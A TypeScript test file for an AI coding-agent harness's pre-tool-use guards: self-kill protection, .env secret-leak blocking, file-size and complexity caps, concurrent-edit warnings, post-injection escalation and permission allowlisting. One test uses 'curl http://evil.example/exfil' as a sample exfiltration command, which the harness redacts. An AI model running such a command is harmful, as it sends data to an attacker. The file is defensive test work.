// Behavioral companion for `pre-tool-phases.ts` — the later PreToolUse guard /
// context / escalation phases extracted from the orchestrator. Each phase
// function is driven directly (input → output / side-effect) rather than
// through `evaluatePreToolUse`, so every branch in the self-kill / env-leak /
// line-cap / complexity / stale-branch / dirty-tree / large-file /
// concurrent-edit / post-injection-escalation / permission-pattern /
// error-memory paths runs against the real logic.
//
// Real temp dirs + real `pre-checks.ts` / `complexity-write-guard.ts` logic are
// used wherever cheap; the error-memory phase uses lightweight typed stubs for
// `ErrorHistory` / `ProjectGraph` so the four branch conditions (history
// present, graph present, session present, Edit-line path) are exercised in
// isolation without the JSONL persistence machinery.

import { execFileSync as run } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ErrorHistory } from "../error-history.js";
import type { ProjectGraph } from "../project-graph.js";
import type { SessionTracker } from "../session-state.js";
import type {
	ErrorRecord,
	EscalationRequest,
	GuardRulesConfig,
	HarnessEvent,
	SessionTrajectory,
} from "../types.js";
import {
	computePostInjectionEscalation,
	evaluateErrorMemory,
	evaluatePermissionPatternDetection,
	evaluatePreChecksSelfKillEnv,
	evaluatePreChecksTail,
} from "./pre-tool-phases.js";

const FIXED_TS = "2026-04-01T00:00:00.000Z";

function makeEvent(overrides: Partial<HarnessEvent> = {}): HarnessEvent {
	return {
		hook_event: "PreToolUse",
		session_id: "sess-1",
		agent_source: "claude",
		tool_name: "Bash",
		timestamp: FIXED_TS,
		...overrides,
	} as unknown as HarnessEvent;
}

function makeSession(overrides: Partial<SessionTrajectory> = {}): SessionTrajectory {
	return {
		session_id: "sess-1",
		agent_name: "agent-a",
		started_at: FIXED_TS,
		tool_call_count: 1,
		tool_sequence: [],
		sensitivity_level: "Public",
		soft_blocks: new Set(),
		fired_reminders: new Set(),
		suggested_permissions: new Set(),
		consecutive_pattern: null,
		curl_localhost_count: {},
		injection_detected_steps: [],
		taint_sources: [],
		files_written: new Set(),
		files_read: new Set(),
		file_write_times: new Map(),
		step_limit: Number.POSITIVE_INFINITY,
		...overrides,
	} as unknown as SessionTrajectory;
}

let tmp: string;
beforeEach(() => {
	tmp = mkdtempSync(join(tmpdir(), "pre-tool-phases-"));
});
afterEach(() => {
	rmSync(tmp, { recursive: true, force: true });
});

// ===========================================================================
// evaluatePreChecksSelfKillEnv
// ===========================================================================

describe("evaluatePreChecksSelfKillEnv", () => {
	it("blocks `kill <self-pid>` (the current process is always protected)", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Bash",
			{ command: `kill ${process.pid}` },
			warnings,
		);
		expect(out?.decision).toBe("block");
		expect(out?.rule_id).toBe("self-kill-protection");
		expect(out?.severity).toBe("critical");
		expect(out?.category).toBe("process-killing");
		expect(out?.reason).toContain(String(process.pid));
		expect(warnings).toHaveLength(0);
	});

	it("does not block an ordinary, non-kill Bash command", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Bash",
			{ command: "ls -la" },
			warnings,
		);
		expect(out).toBeNull();
	});

	it("ignores a Bash event with an empty command string", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(makeEvent({ cwd: tmp }), "Bash", { command: "" }, warnings);
		expect(out).toBeNull();
	});

	it("blocks writing secret-bearing content to a non-gitignored .env file", () => {
		const filePath = join(tmp, ".env");
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Write",
			{ file_path: filePath, content: "API_KEY=sk-not-a-real-secret-123" },
			warnings,
		);
		expect(out?.decision).toBe("block");
		expect(out?.rule_id).toBe("env-leak-to-git");
		expect(out?.severity).toBe("high");
		expect(out?.category).toBe("security");
		expect(out?.reason).toContain(".env");
	});

	it("warns (does not block) on a non-gitignored .env file with no secret-like content", () => {
		const filePath = join(tmp, ".env");
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Write",
			{ file_path: filePath, content: "JUST_A_FLAG=true" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:env-leak]"))).toBe(true);
	});

	it("reads new_string content for an Edit to a .env file", () => {
		const filePath = join(tmp, ".env");
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Edit",
			{ file_path: filePath, old_string: "x", new_string: "SECRET=oops-value-here" },
			warnings,
		);
		expect(out?.decision).toBe("block");
		expect(out?.rule_id).toBe("env-leak-to-git");
	});

	it("uses the `path` key when `file_path` is absent for the env-leak check", () => {
		const filePath = join(tmp, ".env");
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Write",
			{ path: filePath, content: "PASSWORD=hunter2-not-real" },
			warnings,
		);
		expect(out?.decision).toBe("block");
		expect(out?.rule_id).toBe("env-leak-to-git");
	});

	it("ignores a file-write with no resolvable file path", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Write",
			{ content: "API_KEY=whatever" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("does not env-check a non-.env code file", () => {
		const filePath = join(tmp, "config.ts");
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(
			makeEvent({ cwd: tmp }),
			"Write",
			{ file_path: filePath, content: "export const API_KEY = process.env.X;" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("falls back to process.cwd() when the event carries no cwd", () => {
		// No `cwd` on the event → eventCwd = process.cwd(). A plain Bash command
		// exercises that fallback branch without depending on repo state.
		const warnings: string[] = [];
		const out = evaluatePreChecksSelfKillEnv(makeEvent(), "Bash", { command: "echo hi" }, warnings);
		expect(out).toBeNull();
	});
});

// ===========================================================================
// evaluatePreChecksTail
// ===========================================================================

/** Build a single function source with `branches` if-statements (cyclomatic ≈ branches + 1). */
function fnWith(name: string, branches: number): string {
	let s = `export function ${name}(a: number): number {\n\tlet r = 0;\n`;
	for (let i = 0; i < branches; i++) s += `\tif (a === ${i}) r += ${i};\n`;
	return `${s}\treturn r;\n}\n`;
}

describe("evaluatePreChecksTail", () => {
	it("blocks a Write that would create a code file over the per-file line cap", () => {
		const filePath = join(tmp, "huge.ts");
		// 2000 trivial lines — comfortably past the 800-line cap.
		const content = Array.from({ length: 2000 }, (_, i) => `export const v${i} = ${i};`).join("\n");
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession(),
			undefined,
			"Write",
			{ file_path: filePath, content },
			warnings,
		);
		expect(out?.decision).toBe("block");
		expect(out?.rule_id).toBe("large-file-cap");
		expect(out?.severity).toBe("medium");
		expect(out?.category).toBe("file-size");
		expect(out?.reason).toContain("[interlinked:file-size]");
	});

	it("blocks a Write that introduces a NEW over-cyclomatic-cap function", () => {
		const filePath = join(tmp, "complex.ts");
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession(),
			undefined,
			"Write",
			{ file_path: filePath, content: fnWith("tangled", 40) },
			warnings,
		);
		expect(out?.decision).toBe("block");
		expect(out?.rule_id).toBe("cyclomatic-cap");
		expect(out?.severity).toBe("medium");
		expect(out?.category).toBe("complexity");
		expect(out?.reason).toContain("[interlinked:cyclomatic]");
	});

	it("allows a small in-cap, low-complexity code-file Write and reports no warnings", () => {
		const filePath = join(tmp, "ok.ts");
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession(),
			undefined,
			"Write",
			{ file_path: filePath, content: fnWith("ok", 3) },
			warnings,
		);
		expect(out).toBeNull();
		// Only ~6 lines of content → the 50KB large-file warning must not fire.
		expect(warnings.some((w) => w.includes("[interlinked:large-file]"))).toBe(false);
	});

	it("emits the >50KB large-file write warning without blocking (non-cappable extension)", () => {
		// .txt is not a cappable code extension, so the line-cap gate is silent,
		// but the 50KB content-size warning still fires.
		const filePath = join(tmp, "blob.txt");
		const content = "x".repeat(60 * 1024);
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession(),
			undefined,
			"Write",
			{ file_path: filePath, content },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:large-file]"))).toBe(true);
	});

	it("runs the stale-branch check only within the early tool-call window (no warning in a non-git dir)", () => {
		// tool_call_count <= 3 → stale-branch check runs; tmp is not a git repo,
		// so it returns null and pushes no warning. The branch is still executed.
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 2 }),
			undefined,
			"Read",
			{ file_path: join(tmp, "a.ts") },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:stale-branch]"))).toBe(false);
	});

	it("skips the stale-branch check past the early window (tool_call_count > limit)", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Read",
			{ file_path: join(tmp, "a.ts") },
			warnings,
		);
		expect(out).toBeNull();
	});

	it("warns about a dirty working tree before a destructive git command", () => {
		// Real git repo with an uncommitted change → `git checkout` triggers the
		// dirty-worktree warning.
		run("git", ["init", "-q"], { cwd: tmp });
		run("git", ["config", "user.email", "t@t.t"], { cwd: tmp });
		run("git", ["config", "user.name", "t"], { cwd: tmp });
		writeFileSync(join(tmp, "tracked.txt"), "v1\n");
		run("git", ["add", "."], { cwd: tmp });
		run("git", ["commit", "-q", "-m", "init"], { cwd: tmp });
		writeFileSync(join(tmp, "tracked.txt"), "v2-uncommitted\n");

		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Bash",
			{ command: "git checkout main" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:dirty-worktree]"))).toBe(true);
	});

	it("does not warn about the working tree for a non-destructive Bash command", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Bash",
			{ command: "ls" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("runs the stale-branch check against a real git repo within the early window", () => {
		// Build a repo where `feature` (HEAD) is far behind `main`, then drive the
		// tail's stale-branch branch through real git. NOTE: the warning-push at
		// L135 (`if (staleResult?.warning) ...`) is currently UNREACHABLE — the
		// upstream `checkStaleBranch` resolves `mainBranch` via
		// `git rev-parse --verify main && echo main`, whose stdout is "<sha>\nmain";
		// the trailing rev-list then fails and the result is swallowed to null. We
		// pin the observed behavior (in-repo path executed, no warning, no block);
		// fixing that swallow lives in pre-checks.ts, which this test must not edit.
		run("git", ["init", "-q", "-b", "main"], { cwd: tmp });
		run("git", ["config", "user.email", "t@t.t"], { cwd: tmp });
		run("git", ["config", "user.name", "t"], { cwd: tmp });
		writeFileSync(join(tmp, "base.txt"), "base\n");
		run("git", ["add", "."], { cwd: tmp });
		run("git", ["commit", "-q", "-m", "base"], { cwd: tmp });
		run("git", ["checkout", "-q", "-b", "feature"], { cwd: tmp });
		run("git", ["checkout", "-q", "main"], { cwd: tmp });
		for (let i = 0; i < 51; i++) {
			run("git", ["commit", "-q", "--allow-empty", "-m", `c${i}`], { cwd: tmp });
		}
		run("git", ["checkout", "-q", "feature"], { cwd: tmp });

		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			// Unique session id so the per-(session,cwd) stale-branch cache is fresh.
			makeEvent({ cwd: tmp, session_id: "stale-sess" }),
			makeSession({ session_id: "stale-sess", tool_call_count: 1 }),
			undefined,
			"Read",
			{ file_path: join(tmp, "base.txt") },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:stale-branch]"))).toBe(false);
		// 51 real git commits + checkouts under full-suite parallel load can
		// exceed the 30s default; give this real-repo test generous headroom so
		// it stays green on loaded CI runners (scheduling flake, not logic).
	}, 120_000);

	it("falls back to process.cwd() when the tail event carries no cwd", () => {
		// No `cwd` on the event → eventCwd = process.cwd(). A Read past the
		// stale-branch window touches none of the cwd-sensitive write gates,
		// so this just exercises the `|| process.cwd()` fallback branch.
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent(),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Read",
			{ file_path: join(tmp, "x.ts") },
			warnings,
		);
		expect(out).toBeNull();
	});

	it("runs the concurrent-edit check but stays silent when no other session wrote the file", () => {
		// Tracker present and a file path present → checkConcurrentEdit IS called,
		// but the only other session never wrote this file → it returns null and
		// pushes no warning (the falsy `concurrentResult?.warning` branch).
		const filePath = join(tmp, "lonely.ts");
		const other = makeSession({
			session_id: "other-sess",
			agent_name: "agent-b",
			files_written: new Set([join(tmp, "different.ts")]),
			file_write_times: new Map([[join(tmp, "different.ts"), new Date().toISOString()]]),
		});
		const sessions = { getAll: () => [other] } as unknown as SessionTracker;
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			sessions,
			"Edit",
			{ file_path: filePath, old_string: "a", new_string: "b" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:concurrent-edit]"))).toBe(false);
	});

	it("ignores a Bash event with an empty command in the tail phase", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Bash",
			{ command: "" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("warns about a concurrent edit by another live session", () => {
		const filePath = join(tmp, "shared.ts");
		const other = makeSession({
			session_id: "other-sess",
			agent_name: "agent-b",
			files_written: new Set([filePath]),
			file_write_times: new Map([[filePath, new Date().toISOString()]]),
		});
		const sessions = {
			getAll: () => [other],
		} as unknown as SessionTracker;

		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			sessions,
			"Edit",
			{ file_path: filePath, old_string: "a", new_string: "b" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:concurrent-edit]") && w.includes("agent-b"))).toBe(
			true,
		);
	});

	it("does not run the concurrent-edit check when no SessionTracker is supplied", () => {
		const filePath = join(tmp, "shared.ts");
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Edit",
			{ file_path: filePath, old_string: "a", new_string: "b" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:concurrent-edit]"))).toBe(false);
	});

	it("skips the concurrent-edit check when the write has no file path (tracker present)", () => {
		const sessions = { getAll: () => [] } as unknown as SessionTracker;
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			sessions,
			"Write",
			{ content: "no path here" },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:concurrent-edit]"))).toBe(false);
	});

	it("does not run any file-write gates for a pure Read event", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			makeSession({ tool_call_count: 50 }),
			undefined,
			"Read",
			{ file_path: join(tmp, "x.ts") },
			warnings,
		);
		expect(out).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("runs with an undefined session (skips the stale-branch gate entirely)", () => {
		const warnings: string[] = [];
		const out = evaluatePreChecksTail(
			makeEvent({ cwd: tmp }),
			undefined,
			undefined,
			"Write",
			{ file_path: join(tmp, "ok.ts"), content: fnWith("ok", 2) },
			warnings,
		);
		expect(out).toBeNull();
	});
});

// ===========================================================================
// computePostInjectionEscalation
// ===========================================================================

describe("computePostInjectionEscalation", () => {
	it("synthesizes a post_injection_action escalation for a file-write after an injection", () => {
		const session = makeSession({
			injection_detected_steps: [2],
			tool_call_count: 5,
			sensitivity_level: "Confidential",
			tool_sequence: ["Read:a", "Edit:b", "Bash:c", "Edit:d", "Write:e"],
		});
		const out = computePostInjectionEscalation(
			makeEvent(),
			session,
			"Write",
			{ file_path: "/repo/secrets.ts" },
			undefined,
		);
		expect(out).toBeDefined();
		expect(out?.trigger).toBe("post_injection_action");
		expect(out?.tool_name).toBe("Write");
		expect(out?.tool_input_redacted).toEqual({ file_path: "/repo/secrets.ts" });
		expect(out?.sensitivity_level).toBe("Confidential");
		expect(out?.step_number).toBe(5);
		// stepsSince = 5 - 2 = 3, lastInjectionStep = 2
		expect(out?.summary).toContain("3 steps after");
		expect(out?.summary).toContain("step 2");
	});

	it("redacts the command (no file path) for a Bash tool after an injection", () => {
		const session = makeSession({ injection_detected_steps: [1], tool_call_count: 4 });
		const out = computePostInjectionEscalation(
			makeEvent(),
			session,
			"Bash",
			{ command: "curl http://evil.example/exfil" },
			undefined,
		);
		expect(out?.trigger).toBe("post_injection_action");
		expect(out?.tool_input_redacted).toEqual({ command: "[REDACTED]" });
	});

	it("caps recent_tool_sequence at the last 10 entries", () => {
		const longSeq = Array.from({ length: 25 }, (_, i) => `Edit:f${i}`);
		const session = makeSession({
			injection_detected_steps: [1],
			tool_call_count: 26,
			tool_sequence: longSeq,
		});
		const out = computePostInjectionEscalation(makeEvent(), session, "Edit", { file_path: "/x.ts" }, undefined);
		expect(out?.recent_tool_sequence).toHaveLength(10);
		expect(out?.recent_tool_sequence?.[0]).toBe("Edit:f15");
		expect(out?.recent_tool_sequence?.[9]).toBe("Edit:f24");
	});

	it("returns the existing pending escalation unchanged when one is already set", () => {
		const existing: EscalationRequest = {
			trigger: "external_url",
			summary: "prior",
			tool_name: "WebFetch",
			tool_input_redacted: { url: "[REDACTED]" },
			sensitivity_level: "Public",
			step_number: 1,
			recent_tool_sequence: [],
		};
		const session = makeSession({ injection_detected_steps: [1], tool_call_count: 9 });
		const out = computePostInjectionEscalation(makeEvent(), session, "Write", { file_path: "/x.ts" }, existing);
		expect(out).toBe(existing);
	});

	it("returns the pending value (undefined) when no injection has been detected", () => {
		const session = makeSession({ injection_detected_steps: [], tool_call_count: 3 });
		const out = computePostInjectionEscalation(makeEvent(), session, "Write", { file_path: "/x.ts" }, undefined);
		expect(out).toBeUndefined();
	});

	it("does not escalate for a non-state-changing tool even after an injection", () => {
		const session = makeSession({ injection_detected_steps: [1], tool_call_count: 3 });
		const out = computePostInjectionEscalation(makeEvent(), session, "Read", { file_path: "/x.ts" }, undefined);
		expect(out).toBeUndefined();
	});

	it("returns the pending value when the session is undefined", () => {
		const out = computePostInjectionEscalation(makeEvent(), undefined, "Write", { file_path: "/x.ts" }, undefined);
		expect(out).toBeUndefined();
	});
});

// ===========================================================================
// evaluatePermissionPatternDetection
// ===========================================================================

describe("evaluatePermissionPatternDetection", () => {
	let cwdSpy: ReturnType<typeof vi.spyOn>;
	beforeEach(() => {
		// addPermissionToSettings writes to process.cwd()/.claude/settings.json —
		// stub process.cwd() to the temp dir so the repo is never touched.
		// NOT a real process.chdir(): that throws `TypeError: process.chdir()
		// is not supported in workers` under vitest's `pool: "threads"`, which
		// Stryker's own vitest-runner forces unconditionally for every
		// mutation dry run — a real chdir here poisoned every mutation run
		// whose graph-selected test scope happened to include this file.
		cwdSpy = vi.spyOn(process, "cwd").mockReturnValue(tmp);
	});
	afterEach(() => {
		cwdSpy.mockRestore();
	});

	it("starts a new consecutive_pattern counter on first sight of a pattern", () => {
		const session = makeSession();
		const warnings: string[] = [];
		evaluatePermissionPatternDetection(session, "Bash", { command: "ls -la" }, warnings);
		expect(session.consecutive_pattern).toEqual({ pattern: "Bash(ls *)", count: 1 });
		expect(warnings).toHaveLength(0);
	});

	it("increments the counter when the same pattern repeats", () => {
		const session = makeSession();
		const warnings: string[] = [];
		evaluatePermissionPatternDetection(session, "Bash", { command: "ls -la" }, warnings);
		evaluatePermissionPatternDetection(session, "Bash", { command: "ls /tmp" }, warnings);
		expect(session.consecutive_pattern).toEqual({ pattern: "Bash(ls *)", count: 2 });
		expect(warnings).toHaveLength(0);
	});

	it("writes the allowlist entry and warns on the third consecutive identical pattern", () => {
		const session = makeSession();
		const warnings: string[] = [];
		for (let i = 0; i < 3; i++) {
			evaluatePermissionPatternDetection(session, "Bash", { command: `ls dir${i}` }, warnings);
		}
		// Threshold (3) hit → suggested, settings written, counter reset.
		expect(session.suggested_permissions.has("Bash(ls *)")).toBe(true);
		expect(session.consecutive_pattern).toBeNull();
		expect(warnings.some((w) => w.includes("[interlinked:permissions]") && w.includes("Bash(ls *)"))).toBe(
			true,
		);
		// And it really landed in .claude/settings.json under the temp cwd.
		const written = run("cat", [join(tmp, ".claude", "settings.json")], { encoding: "utf-8" });
		expect(written).toContain("Bash(ls *)");
	});

	it("reaches the threshold but pushes no warning when the entry already exists in settings", () => {
		// Pre-seed .claude/settings.json with the pattern already allow-listed, so
		// addPermissionToSettings returns false (duplicate) on the 3rd hit and the
		// `if (added)` warning branch is skipped — while the pattern is still
		// recorded as suggested and the counter reset.
		mkdirSync(join(tmp, ".claude"), { recursive: true });
		writeFileSync(
			join(tmp, ".claude", "settings.json"),
			`${JSON.stringify({ permissions: { allow: ["Bash(ls *)"] } }, null, 2)}\n`,
		);
		const session = makeSession();
		const warnings: string[] = [];
		for (let i = 0; i < 3; i++) {
			evaluatePermissionPatternDetection(session, "Bash", { command: `ls dir${i}` }, warnings);
		}
		expect(session.suggested_permissions.has("Bash(ls *)")).toBe(true);
		expect(session.consecutive_pattern).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("resets the counter when a different pattern interrupts the streak", () => {
		const session = makeSession();
		const warnings: string[] = [];
		evaluatePermissionPatternDetection(session, "Bash", { command: "ls a" }, warnings);
		evaluatePermissionPatternDetection(session, "Bash", { command: "ls b" }, warnings);
		evaluatePermissionPatternDetection(session, "Bash", { command: "cat x" }, warnings);
		expect(session.consecutive_pattern).toEqual({ pattern: "Bash(cat *)", count: 1 });
		expect(warnings).toHaveLength(0);
	});

	it("clears the counter when a tool yields no extractable pattern (null)", () => {
		const session = makeSession({ consecutive_pattern: { pattern: "Bash(ls *)", count: 2 } });
		const warnings: string[] = [];
		// `rm` is a dangerous command → extractPermissionPattern returns null.
		evaluatePermissionPatternDetection(session, "Bash", { command: "rm -rf node_modules" }, warnings);
		expect(session.consecutive_pattern).toBeNull();
		expect(warnings).toHaveLength(0);
	});

	it("does not re-process a pattern already in suggested_permissions", () => {
		const session = makeSession({
			suggested_permissions: new Set(["Bash(ls *)"]),
			consecutive_pattern: { pattern: "Bash(git status *)", count: 1 },
		});
		const warnings: string[] = [];
		evaluatePermissionPatternDetection(session, "Bash", { command: "ls -la" }, warnings);
		// Already-suggested pattern → the consecutive counter is left untouched.
		expect(session.consecutive_pattern).toEqual({ pattern: "Bash(git status *)", count: 1 });
		expect(warnings).toHaveLength(0);
	});

	it("is a no-op when the session is undefined", () => {
		const warnings: string[] = [];
		expect(() =>
			evaluatePermissionPatternDetection(undefined, "Bash", { command: "ls" }, warnings),
		).not.toThrow();
		expect(warnings).toHaveLength(0);
	});
});

// ===========================================================================
// evaluateErrorMemory
// ===========================================================================

/** Minimal GuardRulesConfig carrying only the error_memory toggle the phase reads. */
function rulesWithErrorMemory(enabled: boolean): GuardRulesConfig {
	return { error_memory: { enabled, max_age_s: 86_400, max_records: 5000 } } as unknown as GuardRulesConfig;
}

/** Typed stub graph: identity-style toRelative so assertions stay readable. */
function stubGraph(rel: string): ProjectGraph {
	return { toRelative: (_p: string) => rel } as unknown as ProjectGraph;
}

interface StubHistoryOpts {
	historyWarning?: string | null;
	records?: ErrorRecord[];
}

/** Typed stub ErrorHistory exposing only getFileHistoryWarning + getRecords. */
function stubHistory(opts: StubHistoryOpts = {}): ErrorHistory {
	return {
		getFileHistoryWarning: (_f: string) => opts.historyWarning ?? null,
		getRecords: () => opts.records ?? [],
	} as unknown as ErrorHistory;
}

describe("evaluateErrorMemory", () => {
	it("surfaces the per-file history warning when one exists", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: "[interlinked:error-memory] foo has failed twice" }),
			"Write",
			{ file_path: "/repo/src/foo.ts", content: "x" },
			warnings,
		);
		expect(warnings).toContain("[interlinked:error-memory] foo has failed twice");
	});

	it("does nothing when error_memory is disabled in the rules", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(false),
			makeSession(),
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: "should-not-appear" }),
			"Write",
			{ file_path: "/repo/src/foo.ts" },
			warnings,
		);
		expect(warnings).toHaveLength(0);
	});

	it("does nothing when no ErrorHistory is provided", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph("src/foo.ts"),
			undefined,
			"Write",
			{ file_path: "/repo/src/foo.ts" },
			warnings,
		);
		expect(warnings).toHaveLength(0);
	});

	it("does nothing for a tool that is neither a write nor a read", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: "should-not-appear" }),
			"Bash",
			{ command: "ls" },
			warnings,
		);
		expect(warnings).toHaveLength(0);
	});

	it("does nothing when there is no resolvable file path", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: "should-not-appear" }),
			"Write",
			{ content: "no path" },
			warnings,
		);
		expect(warnings).toHaveLength(0);
	});

	it("does nothing when the project graph is unavailable", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			undefined,
			stubHistory({ historyWarning: "should-not-appear" }),
			"Write",
			{ file_path: "/repo/src/foo.ts" },
			warnings,
		);
		expect(warnings).toHaveLength(0);
	});

	it("works on a Read operation (history warning only, no pattern warnings without a session)", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			undefined,
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: "[interlinked:error-memory] read-path history" }),
			"Read",
			{ file_path: "/repo/src/foo.ts" },
			warnings,
		);
		expect(warnings).toEqual(["[interlinked:error-memory] read-path history"]);
	});

	it("emits no history warning when getFileHistoryWarning returns null but still runs pattern detection", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: null, records: [] }),
			"Write",
			{ file_path: "/repo/src/foo.ts", content: "x" },
			warnings,
		);
		// No history warning, and with an empty record set the pattern detector
		// yields nothing either.
		expect(warnings).toHaveLength(0);
	});

	it("estimates the edit line for an Edit and feeds pattern detection real records", () => {
		// Real on-disk file so estimateEditLine can locate old_string. We seed a
		// hot-region record set that the pattern detector turns into a warning.
		const dir = join(tmp, "src");
		mkdirSync(dir, { recursive: true });
		const filePath = join(dir, "hot.ts");
		const lines = Array.from({ length: 30 }, (_, i) => `const line${i} = ${i};`);
		writeFileSync(filePath, lines.join("\n"));

		const rel = "src/hot.ts";
		const now = new Date().toISOString();
		// Several recent failures clustered around the same line region → the
		// hot-region detector should surface a warning.
		const records: ErrorRecord[] = Array.from({ length: 4 }, (_, i) => ({
			timestamp: now,
			session_id: `s${i}`,
			agent_name: "a",
			file: rel,
			file_role: "leaf",
			check_name: "tsc",
			severity: "error",
			message: "boom",
			diff_context: "",
			line_start: 10,
			line_end: 12,
		}));

		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph(rel),
			stubHistory({ historyWarning: null, records }),
			"Edit",
			{ file_path: filePath, old_string: "const line11 = 11;", new_string: "const line11 = 99;" },
			warnings,
		);
		// At minimum the pattern detector ran against the seeded records and the
		// resolved edit line; it surfaces one or more region/temporal warnings.
		expect(warnings.length).toBeGreaterThan(0);
	});

	it("handles an Edit whose file path is absent (no edit-line estimation, no crash)", () => {
		const warnings: string[] = [];
		evaluateErrorMemory(
			makeEvent(),
			rulesWithErrorMemory(true),
			makeSession(),
			stubGraph("src/foo.ts"),
			stubHistory({ historyWarning: "[interlinked:error-memory] edit history", records: [] }),
			// Edit tool but old_string present and a path so the editLine branch is
			// reachable; the file does not exist so estimateEditLine returns undefined.
			"Edit",
			{ file_path: "/nonexistent/src/foo.ts", old_string: "abc" },
			warnings,
		);
		expect(warnings).toContain("[interlinked:error-memory] edit history");
	});
});
